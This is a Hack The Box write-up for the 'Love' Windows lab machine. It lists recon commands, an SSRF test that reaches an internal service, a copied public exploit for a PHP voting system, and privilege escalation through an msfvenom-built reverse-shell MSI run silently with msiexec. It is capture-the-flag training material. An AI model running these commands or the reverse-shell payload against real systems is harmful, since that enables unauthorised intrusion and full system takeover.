# HTB: Love — Command Cheatsheet

## 📌 Box Info
- **Name:** Love
- **IP:** 10.10.10.245
- **OS:** Windows
- **Difficulty:** Easy

---

## 🔍 Recon
```bash
nmap -sV -sC -oA scan/result $IP
```
- Found services:
  - [HTTP](HTTP) (80, 5000)
  - HTTPS
  - [SMB](SMB)
  - [MySQL](MySQL.md)

Update `/etc/hosts`:
```bash
echo "$IP love.htb staging.love.htb" | sudo tee -a /etc/hosts
```

---

## 🕵️‍ HTTP Enumeration
```bash
gobuster dir --url "http://love.htb/" -w /usr/share/dirb/wordlists/small.txt -x php,txt,config -o http.txt
```
- Result: Nothing interesting found

Search for vulnerable software:
```bash
searchsploit "Voting System"
```
- Found exploit for PHP Voting System (needs credentials)

---

## 📉 Port 5000
- Access denied (403)

---

## 📃 HTTPS Certificate
- View for domain/subdomain info

---

## 📢 staging.love.htb (HTTP)
- Has a URL input field
- Test for SSRF:

```http
GET / HTTP/1.1
Host: staging.love.htb
...
Input URL: http://127.0.0.1:5000
```
- ✅ SSRF Works

---

## 🔨 Exploitation
Copy exploit:
```bash
searchsploit -m 49445.py
```
Edit and run exploit to leverage SSRF and gain access.

---

## 🥵 Privilege Escalation
- Upload **WinPEAS** for local enumeration.
- Detected: `msiexec` install privileges ✅

Generate reverse shell payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=9002 -f msi -o exploit2.msi
```

Upload to target, then execute:
```bash
msiexec /quiet /qn /i exploit2.msi
```

---

## ✅ Root Access
- Reverse shell received with NT AUTHORITY privileges

---

## 📑 Summary
- Used SSRF on subdomain to reach an internal service
- Exploited a vulnerable Voting System
- Privilege escalation via MSI installation permissions